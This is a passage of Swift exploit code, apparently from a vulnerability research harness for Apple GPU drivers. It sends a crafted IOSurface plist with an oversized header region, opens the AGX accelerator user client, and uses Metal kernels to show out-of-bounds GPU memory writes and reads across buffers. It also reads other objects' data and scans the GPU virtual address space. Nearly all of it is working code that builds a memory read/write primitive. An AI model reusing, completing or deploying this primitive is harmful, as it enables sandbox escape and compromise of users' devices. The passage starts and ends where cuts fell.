        emit("xfe: agx final=0x\(String(vaLast, radix: 16))")
        if ac != 0 { xq_IOServiceClose(ac) }
        xq_IOServiceClose(conn)
        emit("xfe: done")
    }

    func f1ConfirmProbe() {
        emit("xfc: confirm pre-touch hypothesis")
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { emit("xfc: open fail"); return }
        xq_IOObjectRelease(svc)
        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68)
        var outSize = 0xc68
        var s0: UInt64 = 0
        f1xml.withCString { cs in
            _ = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
                outBuf.withUnsafeMutableBytes { ob in xq_IOConnectCallMethod(conn, 0, &s0, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize) }
            }
        }
        func rd32(_ o: Int) -> UInt32 {
            guard o + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        guard sid != 0, let surf = IOSurfaceLookup(sid) else { emit("xfc: no surface"); return }
        let base = IOSurfaceGetBaseAddress(surf)

        var ac: io_connect_t = 0
        if let am = "AGXAcceleratorG18P".withCString({ xq_IOServiceMatching($0) }) {
            var ai: io_iterator_t = 0
            if xq_IOServiceGetMatchingServices(0, am, &ai) == KERN_SUCCESS {
                let asvc = xq_IOIteratorNext(ai); xq_IOObjectRelease(ai)
                if asvc != 0 {
                    if xq_IOServiceOpen(asvc, mach_task_self_, 1, &ac) != KERN_SUCCESS { emit("xfc: agx open fail") }
                    xq_IOObjectRelease(asvc)
                }
            }
        }
        if ac != 0 {
            var ain = [UInt8](repeating: 0, count: 0x100)
            ain[0] = 0x82
            ain[0x38] = UInt8(sid & 0xFF); ain[0x39] = UInt8((sid >> 8) & 0xFF)
            ain[0x3a] = UInt8((sid >> 16) & 0xFF); ain[0x3b] = UInt8((sid >> 24) & 0xFF)
            var aout = [UInt8](repeating: 0, count: 0x1000); var aosz = 0x1000
            ain.withUnsafeBytes { ib in aout.withUnsafeMutableBytes { ob in
                _ = xq_IOConnectCallMethod(ac, 8, nil, 0, ib.baseAddress, 0x100, nil, nil, ob.baseAddress, &aosz) } }
            var v: UInt64 = 0; for i in 0..<8 { v |= UInt64(aout[i]) << (8*i) }
            emit("xfc: agx va=0x\(String(v, radix: 16))")
        }

        guard let dev = MTLCreateSystemDefaultDevice(),
              let f1buf = dev.makeBuffer(bytesNoCopy: base, length: 0x10000, options: .storageModeShared, deallocator: nil) else {
            emit("xfc: no buffers"); return }
        let f1ga = f1buf.gpuAddress
        emit("xfc: f1 ga=0x\(String(f1ga, radix: 16))")

        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void wr(device uint *buf [[buffer(0)]], constant uint &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) { buf[idx] = val; }
        kernel void rd(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]], constant uint &idx [[buffer(2)]]) { out[0] = buf[idx]; }
        """
        guard let lib = try? dev.makeLibrary(source: src, options: nil),
              let fwr = lib.makeFunction(name: "wr"), let frd = lib.makeFunction(name: "rd"),
              let pwr = try? dev.makeComputePipelineState(function: fwr),
              let prd = try? dev.makeComputePipelineState(function: frd),
              let q = dev.makeCommandQueue(), let outb = dev.makeBuffer(length: 16, options: .storageModeShared) else {
            emit("xfc: pipeline fail"); return }
        func write(_ b: MTLBuffer, _ i: UInt32, _ v: UInt32) -> Bool {
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return false }
            e.setComputePipelineState(pwr); e.setBuffer(b, offset: 0, index: 0)
            var ii = i, vv = v
            e.setBytes(&ii, length: 4, index: 1); e.setBytes(&vv, length: 4, index: 2)
            e.dispatchThreadgroups(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
            return cb.status == .completed
        }
        func readVia(_ b: MTLBuffer, _ i: UInt32) -> UInt32 {
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return 0xDEADBEEF }
            e.setComputePipelineState(prd); e.setBuffer(b, offset: 0, index: 0); e.setBuffer(outb, offset: 0, index: 1)
            var ii = i
            e.setBytes(&ii, length: 4, index: 2)
            e.dispatchThreadgroups(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
            return outb.contents().bindMemory(to: UInt32.self, capacity: 1)[0]
        }

        // A: untouched by GPU (CPU fill only).
        guard let a = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { return }
        let ap = a.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
        for k in 0..<0x4000 { ap[k] = 0x42424242 }
        let aga = a.gpuAddress
        if aga > f1ga {
            let d = aga - f1ga
            let ok = write(f1buf, UInt32(d / 4), 0x4A4A4A4A)
            emit("xfc: [A untouched] delta=0x\(String(d, radix: 16)) ok=\(ok) a[0]=0x\(String(ap[0], radix: 16)) readViaF1=0x\(String(readVia(f1buf, UInt32(d / 4)), radix: 16))")
        }

        // B: pre-touched through its own VA.
        guard let b = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { return }
        let bp = b.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
        for k in 0..<0x4000 { bp[k] = 0x42424242 }
        _ = write(b, 0, 0x51515151)
        emit("xfc: [B] after own touch b[0]=0x\(String(bp[0], radix: 16))")
        let bga = b.gpuAddress
        if bga > f1ga {
            let d = bga - f1ga
            _ = write(f1buf, UInt32(d / 4), 0x4B4B4B4B)
            emit("xfc: [B pretouched] delta=0x\(String(d, radix: 16)) b[0]=0x\(String(bp[0], radix: 16)) readViaF1=0x\(String(readVia(f1buf, UInt32(d / 4)), radix: 16))")
        }
        if ac != 0 { xq_IOServiceClose(ac) }
        xq_IOServiceClose(conn)
        emit("xfc: done")
    }

    func f1RangeProbe() {
        emit("xfg: primitive range and pre-existing reads")
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { emit("xfg: open fail"); return }
        xq_IOObjectRelease(svc)
        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68); var outSize = 0xc68; var s0: UInt64 = 0
        f1xml.withCString { cs in _ = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
            outBuf.withUnsafeMutableBytes { ob in xq_IOConnectCallMethod(conn, 0, &s0, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize) } } }
        func rd32(_ o: Int) -> UInt32 {
            guard o + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        guard sid != 0, let surf = IOSurfaceLookup(sid) else { emit("xfg: no surface"); return }
        let base = IOSurfaceGetBaseAddress(surf)
        guard let dev = MTLCreateSystemDefaultDevice(),
              let f1buf = dev.makeBuffer(bytesNoCopy: base, length: 0x10000, options: .storageModeShared, deallocator: nil) else {
            emit("xfg: no buffers"); return }
        let f1ga = f1buf.gpuAddress
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void wr(device uint *buf [[buffer(0)]], constant uint &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) { buf[idx] = val; }
        kernel void rd(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]], constant uint &idx [[buffer(2)]]) { out[0] = buf[idx]; }
        """
        guard let lib = try? dev.makeLibrary(source: src, options: nil),
              let fwr = lib.makeFunction(name: "wr"), let frd = lib.makeFunction(name: "rd"),
              let pwr = try? dev.makeComputePipelineState(function: fwr),
              let prd = try? dev.makeComputePipelineState(function: frd),
              let q = dev.makeCommandQueue(), let outb = dev.makeBuffer(length: 16, options: .storageModeShared) else {
            emit("xfg: pipeline fail"); return }
        func write(_ b: MTLBuffer, _ i: UInt32, _ v: UInt32) -> Bool {
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return false }
            e.setComputePipelineState(pwr); e.setBuffer(b, offset: 0, index: 0)
            var ii = i, vv = v
            e.setBytes(&ii, length: 4, index: 1); e.setBytes(&vv, length: 4, index: 2)
            e.dispatchThreadgroups(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
            return cb.status == .completed
        }
        func readVia(_ b: MTLBuffer, _ i: UInt32) -> UInt32 {
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return 0xDEADBEEF }
            e.setComputePipelineState(prd); e.setBuffer(b, offset: 0, index: 0); e.setBuffer(outb, offset: 0, index: 1)
            var ii = i
            e.setBytes(&ii, length: 4, index: 2)
            e.dispatchThreadgroups(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
            return outb.contents().bindMemory(to: UInt32.self, capacity: 1)[0]
        }
        emit("xfg: f1 ga=0x\(String(f1ga, radix: 16))")

        // 1) Pre-existing data of another object, read via F1.
        guard let c = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { return }
        let cp = c.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
        for k in 0..<0x4000 { cp[k] = 0x11223344 }
        _ = write(c, 0, 0xCAFEBABE)                     // GPU-touch first page only
        let cga = c.gpuAddress
        if cga > f1ga {
            let d = cga - f1ga
            let far = UInt32(d / 4) + 0x40              // 256 bytes into the same page
            let got = readVia(f1buf, far)
            emit("xfg: [C] delta=0x\(String(d, radix: 16)) readAt+0x100=0x\(String(got, radix: 16)) expect=0x11223344")
        }

        // 2) Range: 8 MiB buffer, touch the last page, write there via F1.
        let bigLen = 8 * 1024 * 1024
        guard let big = dev.makeBuffer(length: bigLen, options: .storageModeShared) else { return }
        let bp = big.contents().bindMemory(to: UInt32.self, capacity: bigLen / 4)
        for k in 0..<(bigLen / 4) { bp[k] = 0x42424242 }
        let lastIdx = UInt32(bigLen / 4 - 1)
        _ = write(big, lastIdx, 0x52525252)             // map the last page
        emit("xfg: [big] after own touch last=0x\(String(bp[Int(lastIdx)], radix: 16))")
        let bga = big.gpuAddress
        if bga > f1ga {
            let d = bga - f1ga
            _ = write(f1buf, UInt32(d / 4) + lastIdx, 0x53535353)
            emit("xfg: [big] delta=0x\(String(d, radix: 16)) last=0x\(String(bp[Int(lastIdx)], radix: 16)) readViaF1=0x\(String(readVia(f1buf, UInt32(d / 4) + lastIdx), radix: 16))")
        }
        // 3) Unmapped VA behaviour.
        let probeIdx = UInt32(0x0F000000 / 4)
        let okUnmapped = write(f1buf, probeIdx, 0x60606060)
        emit("xfg: [unmapped] ok=\(okUnmapped) read=0x\(String(readVia(f1buf, probeIdx), radix: 16))")
        xq_IOServiceClose(conn)
        emit("xfg: done")
    }

    func f1ShowcaseProbe() {
        emit("??? probe started")

        // ---------- Section 1: IOSurface size validation ----------
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        var f1base: UnsafeMutableRawPointer?
        if let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) {
            var it: io_iterator_t = 0
            if xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS {
                let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
                var conn: io_connect_t = 0
                if svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS {
                    xq_IOObjectRelease(svc)
                    let xmlLen = f1xml.utf8.count + 1
                    var outBuf = [UInt8](repeating: 0, count: 0xc68); var outSize = 0xc68; var s0: UInt64 = 0
                    var kr: kern_return_t = -1
                    f1xml.withCString { cs in _ = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
                        outBuf.withUnsafeMutableBytes { ob in
                            kr = xq_IOConnectCallMethod(conn, 0, &s0, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize) } } }
                    func rd32(_ o: Int) -> UInt32 {
                        guard o + 4 <= outBuf.count else { return 0 }
                        return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
                    }
                    let sid = outSize >= 0x1c ? rd32(0x18) : 0
                    if kr == 0, sid != 0, let surf = IOSurfaceLookup(sid) {
                        let alloc = IOSurfaceGetAllocSize(surf)
                        f1base = IOSurfaceGetBaseAddress(surf)
                        emit("[OK] 4-GiB header value for a 64 KiB surface")
                        emit("     alloc 0x\(String(alloc, radix: 16)) ?? slices \(rd32(0x74)) ?? sel0 kr=0")
                        // AGX resource for the same surface
                        if let am = "AGXAcceleratorG18P".withCString({ xq_IOServiceMatching($0) }) {
                            var ai: io_iterator_t = 0
                            if xq_IOServiceGetMatchingServices(0, am, &ai) == KERN_SUCCESS {
                                let asvc = xq_IOIteratorNext(ai); xq_IOObjectRelease(ai)
                                var ac: io_connect_t = 0
                                if asvc != 0, xq_IOServiceOpen(asvc, mach_task_self_, 1, &ac) == KERN_SUCCESS {
                                    xq_IOObjectRelease(asvc)
                                    var ain = [UInt8](repeating: 0, count: 0x100)
                                    ain[0] = 0x82
                                    ain[0x38] = UInt8(sid & 0xFF); ain[0x39] = UInt8((sid >> 8) & 0xFF)
                                    ain[0x3a] = UInt8((sid >> 16) & 0xFF); ain[0x3b] = UInt8((sid >> 24) & 0xFF)
                                    var aout = [UInt8](repeating: 0, count: 0x1000); var aosz = 0x1000
                                    var akr: kern_return_t = -1
                                    ain.withUnsafeBytes { ib in aout.withUnsafeMutableBytes { ob in
                                        akr = xq_IOConnectCallMethod(ac, 8, nil, 0, ib.baseAddress, 0x100, nil, nil, ob.baseAddress, &aosz) } }
                                    var va: UInt64 = 0; var hdr: UInt64 = 0; var dat: UInt64 = 0
                                    for i in 0..<8 { va |= UInt64(aout[i]) << (8*i); hdr |= UInt64(aout[0x20+i]) << (8*i); dat |= UInt64(aout[0x28+i]) << (8*i) }
                                    if akr == 0 {
                                        emit("[OK] AGX resource built")
                                        emit("     VA 0x\(String(va, radix: 16))")
                                        emit("     header 0x\(String(hdr, radix: 16)) ?? data 0x\(String(dat, radix: 16))")
                                    } else { emit("[NO] AGX sel8 kr=\(akr)") }
                                    xq_IOServiceClose(ac)
                                }
                            }
                        }
                    } else {
                        emit("[NO] F1 surface rejected kr=\(kr)")
                    }
                    xq_IOServiceClose(conn)
                }
            }
        }
        _ = f1base

        // ---------- Section 2: Metal GPU VA access ----------
        guard let dev = MTLCreateSystemDefaultDevice() else { emit("[NO] no Metal device"); return }
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void wr(device uint *buf [[buffer(0)]], constant int &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) { buf[idx] = val; }
        kernel void rd(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]], constant int &idx [[buffer(2)]]) { out[0] = buf[idx]; }
        """
        var lib: MTLLibrary?
        do { lib = try dev.makeLibrary(source: src, options: nil) }
        catch { emit("[NO] library: \(error.localizedDescription)"); return }
        guard let lib, let fwr = lib.makeFunction(name: "wr"), let frd = lib.makeFunction(name: "rd") else {
            emit("[NO] function lookup"); return }
        var pwrO: MTLComputePipelineState?; var prdO: MTLComputePipelineState?
        do {
            pwrO = try dev.makeComputePipelineState(function: fwr)
            prdO = try dev.makeComputePipelineState(function: frd)
        } catch { emit("[NO] pipeline: \(error.localizedDescription)"); return }
        guard let pwr = pwrO, let prd = prdO, let q = dev.makeCommandQueue() else { return }
        guard let outb = dev.makeBuffer(length: 4, options: .storageModeShared) else { return }

        func write(_ b: MTLBuffer, _ idx: Int32, _ v: UInt32) {
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return }
            e.setComputePipelineState(pwr); e.setBuffer(b, offset: 0, index: 0)
            var ii = idx, vv = v
            e.setBytes(&ii, length: 4, index: 1); e.setBytes(&vv, length: 4, index: 2)
            e.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
        }
        func read(_ b: MTLBuffer, _ idx: Int32) -> UInt32 {
            guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return 0 }
            e.setComputePipelineState(prd); e.setBuffer(b, offset: 0, index: 0); e.setBuffer(outb, offset: 0, index: 1)
            var ii = idx
            e.setBytes(&ii, length: 4, index: 2)
            e.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
            return outb.contents().bindMemory(to: UInt32.self, capacity: 1)[0]
        }

        // Plain buffers only: no IOSurface involved.
        guard let plain = dev.makeBuffer(length: 0x10000, options: .storageModeShared),
              let target = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { return }
        let tp = target.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
        for k in 0..<0x4000 { tp[k] = 0x11223344 }
        write(target, 0, 0x11111111)                    // map the target's pages
        guard target.gpuAddress > plain.gpuAddress else { emit("[NO] layout: target below plain"); return }
        let delta = target.gpuAddress - plain.gpuAddress
        let idx = Int32(delta / 4)
        emit("     plain 0x\(String(plain.gpuAddress, radix: 16))")
        emit("     target 0x\(String(target.gpuAddress, radix: 16)) ?? ?? 0x\(String(delta, radix: 16))")

        write(plain, idx, 0x57524954)                   // "WRIT"
        if tp[0] == 0x57524954 {
            emit("[OK] OOB device-pointer access observed")
            emit("[OK] CROSS-BUFFER WRITE")
            emit("     0x11111111 ??? 0x57524954")
        } else {
            emit("[NO] cross-buffer write ?? 0x\(String(tp[0], radix: 16))")
        }

        _ = read(plain, idx)

        let pre = read(plain, idx + 0x40)
        if pre == 0x11223344 {
            emit("[OK] CROSS-BUFFER READ")
            emit("     0x11223344 pre-existing data")
        }

        let unmapped = read(plain, Int32(0x08000000 / 4))
        if unmapped == 0 { emit("[OK] Unmapped VA read returned zero") }
        emit("??? done")
    }


    func f1ScanProbe() {
        emit("??? GPU VA space scan")
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { emit("[NO] no root"); return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { emit("[NO] open"); return }
        xq_IOObjectRelease(svc)
        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68); var outSize = 0xc68; var s0: UInt64 = 0
        f1xml.withCString { cs in _ = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
            outBuf.withUnsafeMutableBytes { ob in xq_IOConnectCallMethod(conn, 0, &s0, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize) } } }
        func rd32(_ o: Int) -> UInt32 {
            guard o + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        guard sid != 0, let surf = IOSurfaceLookup(sid) else { emit("[NO] surface"); return }
        let base = IOSurfaceGetBaseAddress(surf)
        xq_IOServiceClose(conn)
        guard let dev = MTLCreateSystemDefaultDevice(),
              let f1buf = dev.makeBuffer(bytesNoCopy: base, length: 0x10000, options: .storageModeShared, deallocator: nil) else {
            emit("[NO] buffers"); return }
        let f1ga = f1buf.gpuAddress

        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void scan(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]],
                         constant uint &strideWords [[buffer(2)]],
                         uint i [[thread_position_in_grid]]) {
            out[i] = buf[i * strideWords];
        }
        kernel void wr(device uint *buf [[buffer(0)]], constant uint &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) { buf[idx] = val; }
        kernel void rd(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]], constant uint &idx [[buffer(2)]]) { out[0] = buf[idx]; }
        """
        var lib: MTLLibrary?
        do {
            lib = try dev.makeLibrary(source: src, options: nil)
        } catch {
            emit("[NO] library: \(error.localizedDescription)")
            return
        }
        guard let lib else { emit("[NO] library nil"); return }
        guard let fscan = lib.makeFunction(name: "scan"),
              let fwr = lib.makeFunction(name: "wr"),
              let frd = lib.makeFunction(name: "rd") else {
            emit("[NO] function lookup"); return
        }
        var pscanOpt: MTLComputePipelineState?
        var pwrOpt: MTLComputePipelineState?
        var prdOpt: MTLComputePipelineState?
        do {
            pscanOpt = try dev.makeComputePipelineState(function: fscan)
            pwrOpt = try dev.makeComputePipelineState(function: fwr)
            prdOpt = try dev.makeComputePipelineState(function: frd)
        } catch {
            emit("[NO] pipeline: \(error.localizedDescription)")
            return
        }
        guard let pscan = pscanOpt, let pwr = pwrOpt, let prd = prdOpt,
              let q = dev.makeCommandQueue() else { emit("[NO] queue"); return }

        let page = 0x4000
        let count = 1024                                  // 16 MiB window
        guard let outb = dev.makeBuffer(length: count * 4, options: .storageModeShared) else { return }
        let ops = outb.contents().bindMemory(to: UInt32.self, capacity: count)

        guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return }
        e.setComputePipelineState(pscan)
        e.setBuffer(f1buf, offset: 0, index: 0)
